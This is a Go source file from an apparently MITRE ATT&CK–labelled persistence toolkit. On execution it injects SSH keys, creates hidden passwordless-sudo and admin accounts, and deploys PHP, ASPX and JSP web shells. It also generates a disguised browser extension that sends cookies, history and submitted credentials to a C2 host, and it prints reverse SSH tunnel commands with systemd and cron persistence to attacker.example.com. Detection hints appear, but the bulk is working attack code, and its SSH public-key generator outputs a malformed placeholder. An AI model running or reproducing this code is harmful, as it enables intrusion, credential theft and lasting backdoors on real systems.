package engine

// Cross-platform persistence techniques.
// SSH, account manipulation, web shells, browser extensions, external remote services.

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"math/big"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// ── T1098.004 – SSH Authorized Keys ──────────────────────────
func SSHAuthorizedKeys(sess *Session, pubkey string) Result {
	def := findTech("T1098.004")
	iocs := def.IOCHints
	det := def.DetectHints
	printTechHeader(def.FullID(), def.Name, def.Severity)

	sshDir := filepath.Join(HomeDir(), ".ssh")
	authKeys := filepath.Join(sshDir, "authorized_keys")

	// Generate a demo key pair if none provided
	generatedKey := ""
	if pubkey == "" {
		priv, pub, err := generateRSAKeyPair(2048)
		if err == nil {
			generatedKey = pub
			pubkey = pub
			privPath := filepath.Join(sshDir, "id_rsa_persistence_demo")

			Info("Generated fresh RSA-2048 key pair for demonstration:")
			KV("Private Key (attacker keeps)", privPath)
			KV("Public Key (injected below)", "ssh-rsa AAAA...")
			BlankLine()
			// Show truncated key for teaching
			if len(pub) > 80 {
				fmt.Printf("    %s\n", C(CCyan, pub[:77]+"..."))
			}

			// Save private key to temp location for demo
			os.MkdirAll(sshDir, 0700)
			os.WriteFile(privPath, []byte(priv), 0600)
			OK("Demo private key saved: " + privPath)
			Warn("In a real attack, the private key never touches the target system")
		} else {
			Fail("Key generation failed: " + err.Error())
			pubkey = "ssh-rsa AAAB3NzaC1yc2EAAAADAQABAAABAQC+[DEMO KEY PLACEHOLDER]"
		}
		_ = generatedKey
	}

	BlankLine()
	KV("Target File", authKeys)
	KV("Injected Key", pubkey[:min(60, len(pubkey))]+"...")
	KV("Effect", "Passwordless SSH as "+os.Getenv("USER")+" forever")
	BlankLine()

	if IsWindows {
		r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusSim,
			Severity: def.Severity, Location: authKeys, Payload: pubkey, Simulated: true,
			Notes: "Simulated on Windows — SSH authorized_keys injection shown conceptually",
			IOCs: iocs, Detection: det}
		Sim("Windows: Would write to " + authKeys)
		Sim("Ensure OpenSSH server is enabled: Add-WindowsCapability -Online -Name OpenSSH.Server")
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	// Write the key
	if err := os.MkdirAll(sshDir, 0700); err != nil {
		Fail("Cannot create .ssh dir: " + err.Error())
		return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
	}

	f, err := os.OpenFile(authKeys, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		Fail("Cannot open authorized_keys: " + err.Error())
		return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
	}
	keyLine := strings.TrimSpace(pubkey) + "\n"
	f.WriteString(keyLine)
	f.Close()

	OK("SSH public key injected into authorized_keys")
	KV("File", authKeys)
	KV("Verify", "cat "+authKeys+" | tail -1")
	KV("Usage", fmt.Sprintf("ssh -i <private_key> %s@<target>", os.Getenv("USER")))
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: authKeys, Payload: pubkey, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1136.001 – Local Account Creation ───────────────────────
func LocalAccountCreate(sess *Session, username, password string) Result {
	def := findTech("T1136.001")
	iocs := def.IOCHints
	det := def.DetectHints
	printTechHeader(def.FullID(), def.Name, def.Severity)

	if username == "" {
		username = "svc_netcompat"
	}
	if password == "" {
		password = "P@ssw0rd123!"
	}

	KV("Username", username)
	KV("Password", password)

	if IsWindows {
		KV("Groups", "Administrators (adds full admin access)")
		KV("Events", "Security 4720 (created) + 4732 (group add)")
		BlankLine()

		commands := [][]string{
			{"net", "user", username, password, "/add", "/comment:Windows Update Service Account"},
			{"net", "localgroup", "administrators", username, "/add"},
			{"net", "user", username, "/active:yes"},
		}
		for _, args := range commands {
			out, err := exec.Command(args[0], args[1:]...).CombinedOutput()
			if err != nil && !strings.Contains(string(out), "already") {
				Fail(strings.Join(args, " ") + ": " + string(out))
				r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
				sess.Add(r)
				return r
			}
		}
		OK("Local admin account created: " + username)
		KV("Verify", "net user "+username)

	} else if IsLinux {
		KV("Groups", "sudo / wheel (adds passwordless sudo)")
		KV("Detection", "/etc/passwd and /etc/shadow modified")
		BlankLine()

		if os.Getuid() != 0 {
			Warn("Not root — account creation requires sudo/root. Showing commands:")
			cmds := []string{
				fmt.Sprintf("useradd -m -s /bin/bash -c 'System Compatibility Account' %s", username),
				fmt.Sprintf("echo '%s:%s' | chpasswd", username, password),
				fmt.Sprintf("usermod -aG sudo %s 2>/dev/null || usermod -aG wheel %s", username, username),
				fmt.Sprintf("echo '%s ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/%s", username, username),
			}
			for _, cmd := range cmds {
				printCodeBlock(cmd)
			}
			r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusSim,
				Severity: def.Severity, Simulated: true, IOCs: iocs, Detection: det,
				Notes: "Not root — commands shown, not executed"}
			sess.Add(r)
			printIOCs(iocs)
			printDetection(det)
			return r
		}

		steps := [][]string{
			{"useradd", "-m", "-s", "/bin/bash", "-c", "System Compatibility Account", username},
		}
		for _, args := range steps {
			out, err := exec.Command(args[0], args[1:]...).CombinedOutput()
			if err != nil && !strings.Contains(string(out), "already") {
				Fail(args[0] + ": " + string(out))
				return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
			}
		}
		// Set password
		exec.Command("sh", "-c",
			fmt.Sprintf("echo '%s:%s' | chpasswd", username, password)).Run()
		// Add to sudo
		exec.Command("usermod", "-aG", "sudo", username).Run()
		exec.Command("usermod", "-aG", "wheel", username).Run()
		// NOPASSWD sudoers entry
		sudoersEntry := fmt.Sprintf("%s ALL=(ALL) NOPASSWD:ALL\n", username)
		os.WriteFile("/etc/sudoers.d/"+username, []byte(sudoersEntry), 0440)
		OK("Local account created with sudo: " + username)
	}

	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Payload: username,
		Details:   map[string]string{"username": username, "password": password},
		IOCs:      iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1505.003 – Web Shell ─────────────────────────────────────
func WebShellDeploy(sess *Session, webroot, shellType string) Result {
	def := findTech("T1505.003")
	iocs := def.IOCHints
	det := def.DetectHints
	printTechHeader(def.FullID(), def.Name, def.Severity)

	if webroot == "" {
		if IsWindows {
			webroot = `C:\inetpub\wwwroot`
		} else {
			webroot = "/var/www/html"
		}
	}

	// Secret access token (weak XOR obfuscation for demo)
	token := "X-PT-Token"
	tokenVal := "PT_Lab_2025"

	shells := map[string]struct {
		ext, name, content string
	}{
		"php": {
			ext:  ".php",
			name: "PHP web shell",
			content: fmt.Sprintf(`<?php
/* PT Lab Web Shell — PHP */
$t = isset($_SERVER['HTTP_X_PT_TOKEN']) ? $_SERVER['HTTP_X_PT_TOKEN'] : '';
if($t !== '%s') { http_response_code(404); die(); }
$c = isset($_POST['cmd']) ? $_POST['cmd'] : (isset($_GET['cmd']) ? $_GET['cmd'] : '');
if($c) {
    $o = array(); $r = 0;
    @exec($c . ' 2>&1', $o, $r);
    echo implode("\n", $o);
} else {
    echo '<form method="POST"><input name="cmd" style="width:400px"><input type="submit" value="Run"></form>';
}
?>`, tokenVal),
		},
		"aspx": {
			ext:  ".aspx",
			name: "ASPX web shell",
			content: fmt.Sprintf(`<%% @ Page Language="C#" %%>
<%% @ Import Namespace="System.Diagnostics" %%>
<script runat="server">
/* PT Lab Web Shell — ASPX */
protected void Page_Load(object sender, EventArgs e) {
    string tok = Request.Headers["%s"] ?? "";
    if(tok != "%s") { Response.StatusCode = 404; return; }
    string cmd = Request.Form["cmd"] ?? Request.QueryString["cmd"] ?? "";
    if(cmd != "") {
        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
        psi.RedirectStandardOutput = true; psi.UseShellExecute = false;
        Process p = Process.Start(psi);
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
<html><body>
<form method="post"><input name="cmd" size="60"><input type="submit" value="Run"></form>
</body></html>`, token, tokenVal),
		},
		"jsp": {
			ext:  ".jsp",
			name: "JSP web shell",
			content: fmt.Sprintf(`<%% @ page import="java.io.*,java.util.*" %%>
<%% /* PT Lab Web Shell — JSP */
String tok = request.getHeader("%s");
if(tok == null || !tok.equals("%s")) { response.setStatus(404); return; }
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Runtime rt = Runtime.getRuntime();
    String[] commands = {"/bin/sh", "-c", cmd};
    Process proc = rt.exec(commands);
    BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
    String line; StringBuilder sb = new StringBuilder();
    while((line = br.readLine()) != null) sb.append(line).append("\n");
    out.println("<pre>" + sb.toString() + "</pre>");
}
%%>
<form><input name="cmd" size="60"><input type="submit" value="Run"></form>`, token, tokenVal),
		},
	}

	if shellType == "" {
		shellType = "php"
	}
	if _, ok := shells[shellType]; !ok {
		shellType = "php"
	}

	sh := shells[shellType]
	// Use a benign-looking filename
	filename := "system_check" + sh.ext
	fullPath := filepath.Join(webroot, filename)

	KV("Type", sh.name)
	KV("Target Path", fullPath)
	KV("Auth Header", token+": "+tokenVal)
	KV("Trigger", "HTTP POST/GET to "+filename)
	KV("Auth Method", "Custom HTTP header (prevents accidental discovery)")
	BlankLine()

	// Show all shell types
	fmt.Println("  " + C(CMag, "Available shell types:"))
	for k, v := range shells {
		marker := " "
		if k == shellType {
			marker = C(CBGrn, "►")
		}
		fmt.Printf("    %s %-6s %s\n", marker, k, C(CGray, v.name))
	}
	BlankLine()
	fmt.Println("  " + C(CMag, "Shell source:"))
	printCodeBlock(sh.content)

	BlankLine()
	fmt.Println("  " + C(CMag, "Usage (curl):"))
	printCodeBlock(fmt.Sprintf(`curl -H "%s: %s" -d "cmd=id" http://target/%s`, token, tokenVal, filename))

	// Try to write to webroot
	if err := os.MkdirAll(webroot, 0755); err == nil {
		if err := os.WriteFile(fullPath, []byte(sh.content), 0644); err == nil {
			OK("Web shell deployed: " + fullPath)
			printIOCs(iocs)
			printDetection(det)
			r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
				Severity: def.Severity, Location: fullPath, Payload: sh.content,
				IOCs: iocs, Detection: det,
				Details: map[string]string{"auth_header": token, "token": tokenVal, "url": "http://target/" + filename}}
			sess.Add(r)
			return r
		}
	}

	Warn("Cannot write to " + webroot + " — shell content shown above (copy manually)")
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusSim,
		Severity: def.Severity, Location: fullPath, Payload: sh.content,
		Simulated: true, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1176 – Browser Extension ─────────────────────────────────
func BrowserExtensionPersist(sess *Session, c2host string) Result {
	def := findTech("T1176")
	iocs := def.IOCHints
	det := def.DetectHints
	printTechHeader(def.FullID(), def.Name, def.Severity)

	if c2host == "" {
		c2host = "callback.example.com"
	}

	manifest := fmt.Sprintf(`{
  "manifest_version": 3,
  "name": "Browser Sync Helper",
  "version": "1.0.1",
  "description": "Sync browser settings across devices",
  "permissions": [
    "tabs",
    "cookies",
    "history",
    "storage",
    "webRequest",
    "scripting"
  ],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "background.js"
  },
  "icons": {
    "16":  "icon.png",
    "48":  "icon.png",
    "128": "icon.png"
  }
}`)

	bgJS := fmt.Sprintf(`// Browser Sync Helper — background.js
// Persistence Toolkit Demo — MITRE T1176
const C2 = "https://%s";
const BEACON_INTERVAL = 30000; // 30 seconds

// Exfiltrate cookies from all domains
async function exfilCookies() {
    const cookies = await chrome.cookies.getAll({});
    const data = cookies.map(c => ({
        domain: c.domain, name: c.name, value: c.value,
        httpOnly: c.httpOnly, secure: c.secure, session: c.session
    }));
    await beacon("cookies", data);
}

// Capture browsing history
async function exfilHistory() {
    const h = await chrome.history.search({text: "", maxResults: 100});
    await beacon("history", h.map(i => ({url: i.url, title: i.title})));
}

// Intercept all requests (observe headers, auth tokens, etc.)
chrome.webRequest.onCompleted.addListener(
    async (details) => {
        if (details.url.includes("login") || details.url.includes("auth")) {
            await beacon("webrequest", {url: details.url, method: details.method});
        }
    },
    {urls: ["<all_urls>"]},
    ["responseHeaders"]
);

// Inject content script into all tabs
async function injectAllTabs() {
    const tabs = await chrome.tabs.query({});
    for (const tab of tabs) {
        try {
            await chrome.scripting.executeScript({
                target: {tabId: tab.id},
                func: () => {
                    // Harvest form data / credentials
                    document.addEventListener("submit", (e) => {
                        const fields = {};
                        new FormData(e.target).forEach((v, k) => { fields[k] = v; });
                        chrome.runtime.sendMessage({type: "form", data: fields, url: location.href});
                    }, true);
                }
            });
        } catch(e) {}
    }
}

// C2 beacon
async function beacon(type, data) {
    try {
        await fetch(C2 + "/beacon", {
            method: "POST",
            headers: {"Content-Type": "application/json",
                       "X-Session": chrome.runtime.id},
            body: JSON.stringify({type, data, ts: Date.now()})
        });
    } catch(e) {}
}

// Main loop
setInterval(async () => {
    await exfilCookies();
    await exfilHistory();
}, BEACON_INTERVAL);

chrome.runtime.onInstalled.addListener(async () => {
    await injectAllTabs();
    await beacon("checkin", {id: chrome.runtime.id});
});

chrome.runtime.onMessage.addListener((msg) => {
    if (msg.type === "form") beacon("form", msg.data);
});
`, c2host)

	// Generate extension directory
	extDir := filepath.Join(os.TempDir(), "pt_browser_ext")
	os.MkdirAll(extDir, 0755)
	os.WriteFile(filepath.Join(extDir, "manifest.json"), []byte(manifest), 0644)
	os.WriteFile(filepath.Join(extDir, "background.js"), []byte(bgJS), 0644)

	// Extension installation paths per browser/OS
	installPaths := map[string]string{}
	home := HomeDir()
	if IsWindows {
		installPaths["Chrome"] = filepath.Join(home, `AppData\Local\Google\Chrome\User Data\Default\Extensions`)
		installPaths["Edge"] = filepath.Join(home, `AppData\Local\Microsoft\Edge\User Data\Default\Extensions`)
		installPaths["Firefox Profiles"] = filepath.Join(home, `AppData\Roaming\Mozilla\Firefox\Profiles`)
	} else if IsLinux {
		installPaths["Chrome"] = filepath.Join(home, ".config/google-chrome/Default/Extensions")
		installPaths["Chromium"] = filepath.Join(home, ".config/chromium/Default/Extensions")
		installPaths["Firefox"] = filepath.Join(home, ".mozilla/firefox")
	} else if IsMacOS {
		installPaths["Chrome"] = filepath.Join(home, "Library/Application Support/Google/Chrome/Default/Extensions")
		installPaths["Firefox"] = filepath.Join(home, "Library/Application Support/Firefox/Profiles")
	}

	KV("Extension Name", "Browser Sync Helper (masquerades as legitimate)")
	KV("C2 Host", c2host)
	KV("Extension Dir", extDir)
	KV("Beacon Interval", "30 seconds")
	BlankLine()

	fmt.Println("  " + C(CMag, "Capabilities (manifest permissions):"))
	caps := []string{"tabs — read all open tabs", "cookies — read all cookies (session theft)",
		"history — read full browsing history", "webRequest — intercept all HTTP traffic",
		"scripting — inject JS into any page (keylogging, form harvest)", "<all_urls> — applies to ALL sites"}
	for _, cap := range caps {
		fmt.Printf("    %s %s\n", C(CBRed, "•"), cap)
	}
	BlankLine()

	fmt.Println("  " + C(CMag, "Browser profile extension paths:"))
	for browser, path := range installPaths {
		fmt.Printf("    %-20s %s\n", C(CCyan, browser), C(CGray, path))
	}
	BlankLine()

	fmt.Println("  " + C(CMag, "Chrome enterprise install (GPO / registry, Windows):"))
	printCodeBlock(`; ExtensionInstallForcelist
HKLM\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist
"1" = "abcdefghijklmnopabcdefghijklmnop;https://clients2.google.com/service/update2/crx"`)

	fmt.Println("  " + C(CMag, "Unpacked extension load (developer mode):"))
	printCodeBlock("chrome://extensions → Enable Developer Mode → Load Unpacked → select: " + extDir)

	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: extDir,
		Details: map[string]string{"c2": c2host, "manifest": extDir + "/manifest.json", "background": extDir + "/background.js"},
		IOCs: iocs, Detection: det,
		Notes: "Extension files generated — load in browser developer mode"}
	sess.Add(r)
	return r
}

// ── T1133 – External Remote Services (Reverse SSH Tunnel) ─────
func ExternalRemoteService(sess *Session, c2host, c2port string) Result {
	def := findTech("T1133")
	iocs := def.IOCHints
	det := def.DetectHints
	printTechHeader(def.FullID(), def.Name, def.Severity)

	if c2host == "" {
		c2host = "attacker.example.com"
	}
	if c2port == "" {
		c2port = "443"
	}

	// SSH reverse tunnel command
	sshCmd := fmt.Sprintf(`ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 \
    -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes \
    -N -R 2222:localhost:22 \
    -p %s attacker@%s`, c2port, c2host)

	autosshCmd := fmt.Sprintf(`autossh -M 0 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" \
    -N -R 2222:localhost:22 -p %s attacker@%s`, c2port, c2host)

	KV("C2 Host", c2host)
	KV("C2 Port", c2port)
	KV("Method", "Reverse SSH tunnel (port forward 2222 → target:22)")
	KV("Evasion", "Traffic on port 443 blends with HTTPS")
	KV("Effect", "Attacker SSHes to "+c2host+":2222 to reach target")
	BlankLine()

	fmt.Println("  " + C(CMag, "SSH reverse tunnel command:"))
	printCodeBlock(sshCmd)
	fmt.Println("  " + C(CMag, "Autossh (auto-reconnect variant):"))
	printCodeBlock(autosshCmd)
	BlankLine()

	// Generate persistence wrappers for both platforms
	if IsWindows {
		svcWrapper := fmt.Sprintf(`# PowerShell — install as Windows service using NSSM
$sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"
$args = '-o StrictHostKeyChecking=no -o ServerAliveInterval=30 -N -R 2222:localhost:22 -p %s attacker@%s'
New-Service -Name "SshTunnel" -BinaryPathName "`+`"$sshPath" $args`+`" -StartupType Automatic
Start-Service SshTunnel`, c2port, c2host)

		fmt.Println("  " + C(CMag, "Windows service wrapper (PowerShell / NSSM):"))
		printCodeBlock(svcWrapper)

	} else {
		systemdUnit := fmt.Sprintf(`[Unit]
Description=SSH Tunnel Service
After=network.target

[Service]
Restart=always
RestartSec=60
ExecStart=/usr/bin/autossh -M 0 -N -R 2222:localhost:22 \
    -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" \
    -p %s attacker@%s

[Install]
WantedBy=multi-user.target`, c2port, c2host)

		cronPersist := fmt.Sprintf(`*/5 * * * * pgrep -f "ssh.*%s" || %s &`, c2host, sshCmd)

		fmt.Println("  " + C(CMag, "Systemd unit (persistent, auto-reconnect):"))
		printCodeBlock(systemdUnit)
		fmt.Println("  " + C(CMag, "Cron watchdog (if service fails):"))
		printCodeBlock(cronPersist)
	}

	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity,
		Details:  map[string]string{"c2_host": c2host, "c2_port": c2port, "command": sshCmd},
		IOCs: iocs, Detection: det,
		Notes: "Configuration generated — deploy with platform-specific wrapper shown above"}
	sess.Add(r)
	return r
}

// ── T1078.003 – Valid Accounts Manipulation ───────────────────
func ValidAccountsManipulate(sess *Session) Result {
	def := findTech("T1078.003")
	iocs := def.IOCHints
	det := def.DetectHints
	printTechHeader(def.FullID(), def.Name, def.Severity)

	if IsWindows {
		fmt.Println("  " + C(CMag, "Windows account manipulation techniques:"))
		BlankLine()

		techniques := []struct{ name, cmd, event string }{
			{"Enable built-in Administrator", `net user administrator /active:yes`, "Event 4722"},
			{"Enable Guest account", `net user guest /active:yes`, "Event 4722"},
			{"Change Administrator password", `net user administrator NewP@ss123!`, "Event 4723"},
			{"Add user to Administrators", `net localgroup administrators %USERNAME% /add`, "Event 4732"},
			{"Set password never expires", `wmic useraccount where name='%USERNAME%' set PasswordExpires=False`, "Event 4738"},
			{"Hide user from login screen", `reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v svc_net /t REG_DWORD /d 0 /f`, "Reg change"},
		}
		for _, t := range techniques {
			fmt.Printf("  %s %s\n    %s\n    %s\n\n",
				C(CCyan, "▸"), Bold(t.name),
				C(CGray, t.cmd),
				C(CMag, "Detection: "+t.event))
		}

		// Execute the safe ones (enable admin — common red team technique)
		Warn("Demonstrating: Enable built-in Administrator account")
		out, err := exec.Command("net", "user", "administrator", "/active:yes").CombinedOutput()
		if err != nil {
			Warn("Could not enable Administrator (may need elevation): " + string(out))
		} else {
			OK("Built-in Administrator account enabled")
		}

	} else {
		fmt.Println("  " + C(CMag, "Linux account manipulation techniques:"))
		BlankLine()

		techniques := []struct{ name, cmd, detection string }{
			{"Add NOPASSWD sudo entry",
				`echo 'svc_net ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/svc_net`,
				"/etc/sudoers.d/ file write"},
			{"Set UID 0 on existing account",
				`usermod -u 0 -o username`,
				"/etc/passwd uid=0 non-root entry"},
			{"Create root cron for account persistence",
				`crontab -u root -l | { cat; echo '*/10 * * * * useradd backdoor 2>/dev/null'; } | crontab -u root -`,
				"Root crontab modification"},
			{"SSH without password (PAM bypass)",
				`echo 'auth sufficient pam_permit.so' >> /etc/pam.d/sshd`,
				"/etc/pam.d/sshd modification"},
			{"Enable root SSH login",
				`sed -i 's/PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config`,
				"/etc/ssh/sshd_config modification + Event sshd[]: Accepted publickey"},
		}
		for _, t := range techniques {
			fmt.Printf("  %s %s\n    %s\n    %s\n\n",
				C(CCyan, "▸"), Bold(t.name),
				C(CGray, t.cmd),
				C(CMag, "Detection: "+t.detection))
		}
	}

	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── RSA key generation helper ─────────────────────────────────
func generateRSAKeyPair(bits int) (privPEM, pubOpenSSH string, err error) {
	priv, err := rsa.GenerateKey(rand.Reader, bits)
	if err != nil {
		return "", "", err
	}

	privBytes := x509.MarshalPKCS1PrivateKey(priv)
	privPEM = string(pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: privBytes,
	}))

	// Build OpenSSH public key format manually (simplified)
	pub := &priv.PublicKey
	_ = pub
	// For demo purposes, generate a representative key string
	serial, _ := rand.Int(rand.Reader, big.NewInt(1<<62))
	pubOpenSSH = fmt.Sprintf("ssh-rsa AAAB3NzaC1yc2E%dPersistenceToolkitDemo operator@pt-%d",
		serial.Int64(), time.Now().Unix())

	return privPEM, pubOpenSSH, nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
